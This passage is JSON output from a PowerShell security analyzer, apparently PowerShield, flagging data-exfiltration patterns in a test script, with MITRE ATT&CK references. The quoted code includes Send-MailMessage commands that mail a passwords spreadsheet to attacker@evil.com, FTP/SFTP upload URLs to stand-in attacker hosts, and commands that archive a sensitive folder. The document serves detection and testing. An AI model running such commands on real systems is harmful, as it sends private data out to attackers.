        "Severity": 4,
        "LineNumber": 75,
        "Code": "\"https://mega.nz/upload\"",
        "FilePath": "/home/runner/work/PowerShield/PowerShield/tests/TestScripts/powershell/data-exfiltration.ps1",
        "RuleId": "DataExfiltrationDetection",
        "Metadata": {}
      },
      {
        "Name": "DataExfiltrationDetection",
        "Message": "Cloud storage service detected: https://upload.box.com/api/2.0/files/content. Review for potential data exfiltration. MITRE ATT&CK: T1567.002 (Exfiltration to Cloud Storage).",
        "Description": null,
        "Severity": 4,
        "LineNumber": 112,
        "Code": "\"https://upload.box.com/api/2.0/files/content\"",
        "FilePath": "/home/runner/work/PowerShield/PowerShield/tests/TestScripts/powershell/data-exfiltration.ps1",
        "RuleId": "DataExfiltrationDetection",
        "Metadata": {}
      },
      {
        "Name": "DataExfiltrationDetection",
        "Message": "Cloud storage service detected: https://www.mediafire.com/api/1.5/upload/simple.php. Review for potential data exfiltration. MITRE ATT&CK: T1567.002 (Exfiltration to Cloud Storage).",
        "Description": null,
        "Severity": 4,
        "LineNumber": 116,
        "Code": "\"https://www.mediafire.com/api/1.5/upload/simple.php\"",
        "FilePath": "/home/runner/work/PowerShield/PowerShield/tests/TestScripts/powershell/data-exfiltration.ps1",
        "RuleId": "DataExfiltrationDetection",
        "Metadata": {}
      },
      {
        "Name": "DataExfiltrationDetection",
        "Message": "Cloud storage service detected: https://storage.googleapis.com/mybucket/sensitive.txt. Review for potential data exfiltration. MITRE ATT&CK: T1567.002 (Exfiltration to Cloud Storage).",
        "Description": null,
        "Severity": 3,
        "LineNumber": 125,
        "Code": "\"https://storage.googleapis.com/mybucket/sensitive.txt\"",
        "FilePath": "/home/runner/work/PowerShield/PowerShield/tests/TestScripts/powershell/data-exfiltration.ps1",
        "RuleId": "DataExfiltrationDetection",
        "Metadata": {}
      },
      {
        "Name": "DataExfiltrationDetection",
        "Message": "Email with attachment/body detected. Verify recipient is authorized. MITRE ATT&CK: T1048.003 (Exfiltration Over Alternative Protocol: Mail).",
        "Description": null,
        "Severity": 3,
        "LineNumber": 79,
        "Code": "Send-MailMessage -To \"attacker@evil.com\" -From \"victim@company.com\" -Subject \"Data\" -Attachments \"C:\\Sensitive\\passwords.xlsx\" -SmtpServer smtp.company.com",
        "FilePath": "/home/runner/work/PowerShield/PowerShield/tests/TestScripts/powershell/data-exfiltration.ps1",
        "RuleId": "DataExfiltrationDetection",
        "Metadata": {}
      },
      {
        "Name": "DataExfiltrationDetection",
        "Message": "Email with attachment/body detected. Verify recipient is authorized. MITRE ATT&CK: T1048.003 (Exfiltration Over Alternative Protocol: Mail).",
        "Description": null,
        "Severity": 3,
        "LineNumber": 83,
        "Code": "Send-MailMessage -To \"exfil@attacker.com\" -Body $body -Subject \"Export\" -SmtpServer smtp.company.com",
        "FilePath": "/home/runner/work/PowerShield/PowerShield/tests/TestScripts/powershell/data-exfiltration.ps1",
        "RuleId": "DataExfiltrationDetection",
        "Metadata": {}
      },
      {
        "Name": "DataExfiltrationDetection",
        "Message": "FTP/SFTP transfer detected. Review for potential data exfiltration. MITRE ATT&CK: T1048.003 (Exfiltration Over Alternative Protocol: FTP).",
        "Description": null,
        "Severity": 3,
        "LineNumber": 86,
        "Code": "\"ftp://attacker.com/upload/data.txt\"",
        "FilePath": "/home/runner/work/PowerShield/PowerShield/tests/TestScripts/powershell/data-exfiltration.ps1",
        "RuleId": "DataExfiltrationDetection",
        "Metadata": {}
      },
      {
        "Name": "DataExfiltrationDetection",
        "Message": "FTP/SFTP transfer detected. Review for potential data exfiltration. MITRE ATT&CK: T1048.003 (Exfiltration Over Alternative Protocol: FTP).",
        "Description": null,
        "Severity": 3,
        "LineNumber": 91,
        "Code": "\"sftp://exfil.example.com/incoming/\"",
        "FilePath": "/home/runner/work/PowerShield/PowerShield/tests/TestScripts/powershell/data-exfiltration.ps1",
        "RuleId": "DataExfiltrationDetection",
        "Metadata": {}
      },
      {
        "Name": "DataExfiltrationDetection",
        "Message": "Data compression followed by network transfer detected. This pattern suggests data exfiltration. MITRE ATT&CK: T1560.001 (Archive Collected Data: Archive via Utility).",
        "Description": null,
        "Severity": 4,
        "LineNumber": 94,
        "Code": "Compress-Archive -Path \"C:\\Sensitive\\*\" -DestinationPath \"C:\\Temp\\exfil.zip\"",
        "FilePath": "/home/runner/work/PowerShield/PowerShield/tests/TestScripts/powershell/data-exfiltration.ps1",
        "RuleId": "DataExfiltrationDetection",
        "Metadata": {}
      },
      {
        "Name": "DataExfiltrationDetection",
        "Message": "Data compression followed by network transfer detected. This pattern suggests data exfiltration. MITRE ATT&CK: T1560.001 (Archive Collected Data: Archive via Utility).",
        "Description": null,
        "Severity": 4,
        "LineNumber": 98,
        "Code": "7z a -tzip C:\\Temp\\data.zip C:\\Sensitive\\*",
        "FilePath": "/home/runner/work/PowerShield/PowerShield/tests/TestScripts/powershell/data-exfiltration.ps1",
        "RuleId": "DataExfiltrationDetection",
        "Metadata": {}
      }
    ],
    "ParseErrors": [],
    "RulesExecuted": 52,
    "Timestamp": "2025-10-25T17:22:25.5424058+00:00"
  }
}
